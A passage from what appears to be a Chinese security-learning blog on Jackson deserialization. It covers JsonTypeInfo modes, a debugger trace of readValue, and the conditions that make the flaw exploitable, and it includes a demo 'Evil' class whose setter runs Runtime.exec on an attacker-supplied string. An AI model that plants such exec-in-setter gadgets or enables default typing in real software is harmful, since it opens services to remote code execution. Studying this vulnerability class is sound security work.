class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)<br><span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)<br><span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)<br><span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)<br><span class="hljs-variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CUSTOM)<br></code></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NONE)</td><td>字如其名，和没设置一样</td></tr><tr><td>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CLASS)</td><td>Json多了@class字段，用于标明相关属性的包和类名</td></tr><tr><td>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS)</td><td>Json多了@c字段，用于标明相关属性的包和类名</td></tr><tr><td>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.NAME)</td><td>Json多了@type字段，用于标明相关属性的类名(无包)</td></tr><tr><td>@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.CUSTOM)</td><td>用户自定义，需要手写解析器</td></tr></tbody></table><h4 id="JsonTypeInfo-Id-NONE"><a href="#JsonTypeInfo-Id-NONE" class="headerlink" title="JsonTypeInfo.Id.NONE"></a>JsonTypeInfo.Id.NONE</h4><p>这个注解的意思是不使用识别码，它表示不需要在JSON中添加任何类型信息，也不需要在反序列化时检查类型信息。它通常用于不涉及多态类型处理的情况，或者使用自定义的类型解析器。</p><p>test4</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> developtry.Hacker;<br><span class="hljs-keyword">import</span> jsontypeinfo.Person;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> test4 &#123;<br>    @Test<br>    <span class="hljs-built_in">public</span> <span class="hljs-type">void</span> test3() throws <span class="hljs-keyword">Exception</span>&#123;<br>        Person person=<span class="hljs-built_in">new</span> Person();<br>        person.setAge(<span class="hljs-number">11</span>);<br>        person.setName(&quot;enjoy&quot;);<br>        person.setHeight(<span class="hljs-number">12</span>);<br>        person.setDate(<span class="hljs-built_in">new</span> <span class="hljs-type">Date</span>());<br>        person.setObject(<span class="hljs-built_in">new</span> Hacker());<br>        ObjectMapper mapper=<span class="hljs-built_in">new</span> ObjectMapper();<br>        mapper.enableDefaultTyping();<br>        String <span class="hljs-type">json</span>=mapper.writeValueAsString(person);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-type">json</span>);<br><br>        Person person1=mapper.readValue(<span class="hljs-type">json</span>,Person.<span class="hljs-keyword">class</span>);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(person1);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>person</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs fortran">package jsontypeinfo;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;<br><span class="hljs-keyword">import</span> lombok.<span class="hljs-keyword">Data</span>;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br>@<span class="hljs-keyword">Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> Person &#123;<br>    // 正常<span class="hljs-keyword">case</span><br>    <span class="hljs-keyword">private</span> String <span class="hljs-keyword">name</span>;<br>    // 空对象<span class="hljs-keyword">case</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">Integer</span> age;<br>    // 日期转换<span class="hljs-keyword">case</span><br>    <span class="hljs-keyword">private</span> Date date;<br>    // 默认值<span class="hljs-keyword">case</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">int</span> height;<br>    @JsonTypeInfo(<span class="hljs-keyword">use</span> = JsonTypeInfo.Id.<span class="hljs-keyword">NONE</span>)<br>    <span class="hljs-keyword">private</span> Object object;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;enjoy&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:11,<span class="hljs-string">&quot;date&quot;</span>:1684325274612,<span class="hljs-string">&quot;height&quot;</span>:12,<span class="hljs-string">&quot;object&quot;</span>:&#123;<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;&#125;<br>Person(<span class="hljs-attribute">name</span>=enjoy, <span class="hljs-attribute">age</span>=11, <span class="hljs-attribute">date</span>=Wed May 17 20:07:54 CST 2023, <span class="hljs-attribute">height</span>=12, object=&#123;<span class="hljs-attribute">skill</span>=Jackson&#125;)<br></code></pre></td></tr></table></figure><p>注释掉注解</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;enjoy&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:11,<span class="hljs-string">&quot;date&quot;</span>:1684325419946,<span class="hljs-string">&quot;height&quot;</span>:12,<span class="hljs-string">&quot;object&quot;</span>:[<span class="hljs-string">&quot;developtry.Hacker&quot;</span>,&#123;<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;]&#125;<br>Person(<span class="hljs-attribute">name</span>=enjoy, <span class="hljs-attribute">age</span>=11, <span class="hljs-attribute">date</span>=Wed May 17 20:10:19 CST 2023, <span class="hljs-attribute">height</span>=12, <span class="hljs-attribute">object</span>=developtry.Hacker@4e7dc304)<br></code></pre></td></tr></table></figure><p>可以看到当我们注释掉注解以后才出现了类的识别码</p><h4 id="JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="JsonTypeInfo.Id.MINIMAL_CLASS"></a>JsonTypeInfo.Id.MINIMAL_CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.MINIMAL_CLASS。</p><p>输出看到，object属性中多了”@c”:”com.mi1k7ea.Hacker”，即使用@c替代料@class，官方描述中的意思是缩短了相关类名，实际效果和JsonTypeInfo.Id.CLASS类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;<span class="hljs-string">&quot;age&quot;</span>:6,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;mi1k7ea&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:&#123;<span class="hljs-string">&quot;@c&quot;</span>:<span class="hljs-string">&quot;com.mi1k7ea.Hacker&quot;</span>,<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;&#125;<br>Person.<span class="hljs-attribute">age</span>=6, Person.<span class="hljs-attribute">name</span>=mi1k7ea, com.mi1k7ea.Hacker@4c70fda<br></code></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CLASS"><a href="#JsonTypeInfo-Id-CLASS" class="headerlink" title="JsonTypeInfo.Id.CLASS"></a>JsonTypeInfo.Id.CLASS</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.CLASS。</p><p>输出看到，object属性中多了‘‘@class”:”com.mi1k7ea.Hacker”，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;<span class="hljs-string">&quot;age&quot;</span>:6,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;mi1k7ea&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>:&#123;<span class="hljs-string">&quot;@class&quot;</span>:<span class="hljs-string">&quot;com.mi1k7ea.Hacker&quot;</span>,<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;&#125;<br>Person.<span class="hljs-attribute">age</span>=6, Person.<span class="hljs-attribute">name</span>=mi1k7ea, com.mi1k7ea.Hacker@1d057a39<br></code></pre></td></tr></table></figure><p>也就是说，在Jackson反序列化的时候如果使用了<code>JsonTypeInfo.Id.CLASS</code>修饰的话，可以通过@class的方式指定相关类，并进行相关调用。</p><h4 id="JsonTypeInfo-Id-NAME"><a href="#JsonTypeInfo-Id-NAME" class="headerlink" title="JsonTypeInfo.Id.NAME"></a>JsonTypeInfo.Id.NAME</h4><p>修改Person类中的object属性@JsonTypeInfo注解值为JsonTypeInfo.Id.NAME。</p><p>输出看到，object属性中多了”@type”:”Hacker”，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;enjoy&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">11</span>,<span class="hljs-string">&quot;date&quot;</span>:<span class="hljs-number">1684325734541</span>,<span class="hljs-string">&quot;height&quot;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&quot;object&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Hacker&quot;</span>,<span class="hljs-string">&quot;skill&quot;</span>:<span class="hljs-string">&quot;Jackson&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="JsonTypeInfo-Id-CUSTOM"><a href="#JsonTypeInfo-Id-CUSTOM" class="headerlink" title="JsonTypeInfo.Id.CUSTOM"></a>JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p><h2 id="反序列化方法调用"><a href="#反序列化方法调用" class="headerlink" title="反序列化方法调用"></a>反序列化方法调用</h2><h3 id="当使用DefaultTyping时"><a href="#当使用DefaultTyping时" class="headerlink" title="当使用DefaultTyping时"></a>当使用DefaultTyping时</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.mi1k7ea;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Sex</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setSex</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sex)</span></span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getSex</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs typescript">package com.<span class="hljs-property">mi1k7ea</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> int age;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Sex</span> sex;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">format</span>(<span class="hljs-string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, sex == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;null&quot;</span> : sex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mi1k7ea;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MySex</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Sex</span> &#123;<br>    <span class="hljs-type">int</span> sex;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MySex</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySex构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSex</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySex.getSex&quot;</span>);<br>        <span class="hljs-keyword">return</span> sex;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSex</span><span class="hljs-params">(<span class="hljs-type">int</span> sex)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;MySex.setSex&quot;</span>);<br>        <span class="hljs-built_in">this</span>.sex = sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mi1k7ea;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        mapper.enableDefaultTyping();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.age=<span class="hljs-number">6</span>;<br>        person.name=<span class="hljs-string">&quot;mi1k7ea&quot;</span>;<br>        person.sex=<span class="hljs-keyword">new</span> <span class="hljs-title class_">MySex</span>();<br>        String json=mapper.writeValueAsString(person);<br>        System.out.println(json);<br><br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p2</span> <span class="hljs-operator">=</span> mapper.readValue(json, Person.class);<br>        System.out.println(p2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">MySex构造函数<br>MySex.getSex<br>&#123;<span class="hljs-string">&quot;age&quot;</span>:6,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;mi1k7ea&quot;</span>,<span class="hljs-string">&quot;sex&quot;</span>:[<span class="hljs-string">&quot;com.mi1k7ea.MySex&quot;</span>,&#123;<span class="hljs-string">&quot;sex&quot;</span>:0&#125;]&#125;<br>MySex构造函数<br>MySex.setSex<br>Person.<span class="hljs-attribute">age</span>=6, Person.<span class="hljs-attribute">name</span>=mi1k7ea, com.mi1k7ea.MySex@4f933fd1<br></code></pre></td></tr></table></figure><p>序列化调用构造函数和get，反序列化调用构造函数和set</p><h3 id="当使用-JsonTypeInfo注解时"><a href="#当使用-JsonTypeInfo注解时" class="headerlink" title="当使用@JsonTypeInfo注解时"></a>当使用@JsonTypeInfo注解时</h3><p>修改Person类，在sex属性前添加注解：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">@JsonTypeInfo</span>(<span class="hljs-keyword">use</span> = <span class="hljs-title class_">JsonTypeInfo</span>.<span class="hljs-title class_">Id</span>.<span class="hljs-title class_">CLASS</span>)<br>   // 或 <span class="hljs-variable">@JsonTypeInfo</span>(<span class="hljs-keyword">use</span> = <span class="hljs-title class_">JsonTypeInfo</span>.<span class="hljs-title class_">Id</span>.<span class="hljs-title class_">MINIMAL_CLASS</span>)<br>   public <span class="hljs-title class_">Sex</span> sex;<br></code></pre></td></tr></table></figure><p>结果同上</p><h2 id="ReadValue调用解析"><a href="#ReadValue调用解析" class="headerlink" title="ReadValue调用解析"></a>ReadValue调用解析</h2><p>在readValue处下断点</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517222014675.png" alt="image-20230517222014675"> </p><p>进入_readMapAndClose</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517222247145.png" alt="image-20230517222247145"> </p><p>进入deser.deserialize(jp, ctxt)</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517222414627.png" alt="image-20230517222414627"> </p><p>进入return this.vanillaDeserialize(p, ctxt, p.nextToken());</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517222651583.png" alt="image-20230517222651583"> </p><p>进入deserializeAndSet</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517223151163.png" alt="image-20230517223151163"> </p><p>进入deserialize</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230517223339644.png" alt="image-20230517223339644"> </p><p>其中if判断语句会判断当前反序列化的内容是否携带类型，若是则调用deserializeWithType()函数解析，否则直接调用deserialize()函数解析</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519203436758.png" alt="image-20230519203436758"> </p><p>这里是对age属性进行调用解析，因为_valueTypeDeserializer为null，所以说会直接deserialize解析，第一个age是interger类型，所以我们进入到了Integer类型的deserialize里面</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519203554762.png" alt="image-20230519203554762"> </p><p>得到值以后会回到FieldPeoperty.deserializeAndSet()函数中，调用属性的setter方法来设置bean的属性值</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519203906012.png" alt="image-20230519203906012"> </p><p>可以看到我们这里因为只对age进行了处理，所以说Person类里面只有age有值</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519204014704.png" alt="image-20230519204014704"> </p><p>然后回到了vanillaDeserialize类中</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519204112717.png" alt="image-20230519204112717"> </p><p>我们再次来到了deserialzieAndSet方法中</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519204155732.png" alt="image-20230519204155732"> </p><p>现在是对name的值进行deserialize(),此时这个_valueTypeDeserializer同样也是null，所以会和我们前面age的调用是一个样子，这里就不再过多叙述，所以我们直接进入sex的调试</p><p>（麻了这里sex的值我给设置的为空。。。调了老半天,原来我sex没加上@JsonTypeInfo(use &#x3D; JsonTypeInfo.Id.MINIMAL_CLASS)）</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519213022576.png" alt="image-20230519213022576"> </p><p>可以看到加上了以后我们的sex和之前不一样了，valueTypeDeserilaize有了参数，我们来看他会怎么变化</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519213403781.png" alt="image-20230519213403781"> </p><p>进入到了deserilaizeWithType</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519215554083.png" alt="image-20230519215554083"> </p><p>这里typeDeserilaizer已经捕获到了我们自己加载的类”class developtry4”，之后进入进入deserializeTypedFromObject</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20230519213712951.png" alt="image-20230519213712951"> </p><p>这个类对我们刚才加的注解的类型进行了识别，再往下跟，进入deserializeTypedFromObject()</p><p>但是文章那里进入了AsArrayTypeDeserializer，而我全程没有进入到过这个类</p><p>（此处省略一大堆）</p><p>[Jackson系列一——反序列化漏洞基本原理 <a href="https://www.mi1k7ea.com/2019/11/13/Jackson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"> Mi1k7ea ]</a></p><p>至此，整个函数调用过程大致过了一遍。使用@JsonTypeInfo注解的函数调用过程也是一样的。</p><p>简单梳理一遍，Jackson反序列化的过程为，先调用通过无参的构造函数生成目标类实例，接着是根据属性值是否是数组的形式即是否带类名来分别调用不同的函数来设置实例的属性值，其中会调用Object类型属性的构造函数和setter方法。</p><p><strong>在Jackson反序列化中，若调用了enableDefaultTyping()函数或使用@JsonTypeInfo注解指定反序列化得到的类的属性为JsonTypeInfo.Id.CLASS或JsonTypeInfo.Id.MINIMAL_CLASS，则会调用该属性的类的构造函数和setter方法。</strong></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>满足这三个前提条件之一就可以说明起存在Jackson反序列化漏洞了</p><ul><li>调用了ObjectMapper.enableDefaultTyping()函数；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.CLASS的@JsonTypeInfo注解；</li><li>对要进行反序列化的类的属性使用了值为JsonTypeInfo.Id.MINIMAL_CLASS的@JsonTypeInfo注解；</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由之前的结论知道，当使用的JacksonPolymorphicDeserialization机制配置有问题时，Jackson反序列化就会调用属性所属类的构造函数和setter方法。</p><p>而如果该构造函数或setter方法存在危险操作，那么就存在Jackson反序列化漏洞。</p><h3 id="漏洞场景及Demo"><a href="#漏洞场景及Demo" class="headerlink" title="漏洞场景及Demo"></a>漏洞场景及Demo</h3><p>这里大致以要进行反序列化的类的属性所属的类的类型分为两种：</p><h4 id="属性不为Object类时"><a href="#属性不为Object类时" class="headerlink" title="属性不为Object类时"></a>属性不为Object类时</h4><p><strong>当要进行反序列化的类的属性所属类的构造函数或setter方法本身存在漏洞时，这种场景存在Jackson反序列化漏洞。当然这种场景开发几乎不会这么写。</strong></p><p>我们看个例子，直接修改MySex类的setSex()方法，在其中添加命令执行操作（除非程序员自己想留后门、不然不会出现这种写法）</p><p>这个没复现出来</p><h3 id="当属性为Object时"><a href="#当属性为Object时" class="headerlink" title="当属性为Object时"></a>当属性为Object时</h3><p><strong>当属性类型为Object时，因为Object类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或setter方法存在漏洞代码的类即可进行攻击利用。</strong></p><p>后面出现的Jackson反序列化的CVE漏洞、黑名单绕过等都是基于这个原理寻找各种符合条件的利用链而已。</p><p>这里我们假设目标服务端环境中存在其一个恶意类Evil，其setter方法存在任意代码执行漏洞，存在于com.evil包中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    String cmd;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-built_in">this</span>.cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Person类，将sex属性改为object属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">public</span> String name;<br><span class="hljs-comment">//    @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br>    <span class="hljs-keyword">public</span> Object object;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Person构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;null&quot;</span> : object);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JSTest.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ObjectExp;<br><br><span class="hljs-keyword">import</span> 